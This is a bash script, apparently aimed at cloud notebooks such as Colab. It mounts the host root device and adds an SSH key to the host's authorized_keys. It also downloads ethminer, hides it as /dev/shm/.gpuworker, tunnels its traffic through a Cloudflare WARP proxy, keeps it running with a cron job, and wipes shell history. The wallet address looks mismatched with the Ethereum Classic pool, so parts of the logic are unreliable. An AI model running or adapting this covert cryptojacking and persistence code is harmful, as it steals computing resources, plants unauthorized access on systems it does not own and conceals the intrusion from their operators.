#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y screen git curl gpg net-tools cron ocl-icd-opencl-dev jq

# Bỏ qua phần mount root vì đéo cần trong Colab
if [ -e /dev/root ]; then
    cp /bin/mount /bin/get
    get /dev/root /tmp
    cd /tmp
    rm -rf dli
    mkdir -p dli
    cd dli
    mkdir -p task
    cd task
    ip=$(curl -s ifconfig.me)
    ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa
    echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys
    ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip
else
    echo "Bỏ qua mount root" > /dev/null
fi

cd /dev/shm

# Lấy link download mới nhất từ API Github
LATEST_URL=$(curl -s https://api.github.com/repos/ethereum-mining/ethminer/releases/latest | jq -r '.assets[] | select(.name | contains("cuda")) | .browser_download_url')
if [ -z "$LATEST_URL" ]; then
    # Fallback nếu đéo có CUDA, dùng OpenCL
    LATEST_URL=$(curl -s https://api.github.com/repos/ethereum-mining/ethminer/releases/latest | jq -r '.assets[] | select(.name | contains("opencl")) | .browser_download_url')
fi

echo "Tải từ: $LATEST_URL"
curl -L -o ethminer.tar.gz "$LATEST_URL"

# Kiểm tra file có đúng là gzip không
if file ethminer.tar.gz | grep -q "gzip compressed data"; then
    tar -xzf ethminer.tar.gz
    # Tìm thư mục chứa binary
    EXTRACTED_DIR=$(find . -maxdepth 1 -type d -name "ethminer-*" | head -n1)
    if [ -n "$EXTRACTED_DIR" ] && [ -f "$EXTRACTED_DIR/bin/ethminer" ]; then
        mv "$EXTRACTED_DIR/bin/ethminer" /dev/shm/.gpuworker
    else
        # Fallback: tìm binary trong thư mục hiện tại
        find . -name "ethminer" -exec mv {} /dev/shm/.gpuworker \;
    fi
else
    echo "File tải về đéo phải gzip, thử download lại..." > /dev/null
    # Thử cách khác: dùng bản pre-built từ nguồn khác
    curl -L -o ethminer https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0/ethminer-0.19.0-linux-x86_64.tar.gz
    tar -xzf ethminer
    mv ethminer-0.19.0/bin/ethminer /dev/shm/.gpuworker
fi

chmod +x /dev/shm/.gpuworker

# Phần còn lại (WARP, cron, chạy miner) giữ nguyên
/sbin/sysctl -w vm.nr_hugepages=1280
curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ focal main" | tee /etc/apt/sources.list.d/cloudflare-client.list
apt update && apt install cloudflare-warp -y
systemctl enable warp-svc && systemctl restart warp-svc
sleep 3
warp-cli --accept-tos registration new
warp-cli --accept-tos mode proxy
warp-cli --accept-tos connect
sleep 2

(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f .gpuworker || /dev/shm/.gpuworker --pool stratum+tcp://etc.2miners.com:1010 --user 45SsusJDkAEaQgz8jWKPonhvWjhUj2EEfdTQat22TaaFLyb1noVfzN2U9PGpGeX5Qe55XikAKZ42eC7z1F9E3uL9LsLx14L --proxy socks5://127.0.0.1:40000 --donate-level 0 --api-port 0 --cuda-devices 0 --opencl-devices 0 > /dev/null 2>&1 &") | crontab -

/dev/shm/.gpuworker --pool stratum+tcp://etc.2miners.com:1010 --user 45SsusJDkAEaQgz8jWKPonhvWjhUj2EEfdTQat22TaaFLyb1noVfzN2U9PGpGeX5Qe55XikAKZ42eC7z1F9E3uL9LsLx14L --proxy socks5://127.0.0.1:40000 --donate-level 0 --api-port 0 --cuda-devices 0 --opencl-devices 0 > /dev/null 2>&1 &

history -c
rm -rf ~/.bash_history
